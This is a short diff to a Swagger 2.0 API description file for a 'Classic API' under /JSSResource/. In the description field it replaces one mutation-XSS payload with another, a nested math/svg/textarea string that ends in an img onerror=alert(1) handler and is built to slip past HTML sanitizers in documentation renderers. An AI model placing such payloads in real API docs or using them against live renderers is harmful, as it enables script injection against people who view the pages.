@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><table><mglyph><textarea><math href=javascript:alert(1)>CLICKME</math>
+    <math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">
   version: production
 basePath: /JSSResource/
 produces:
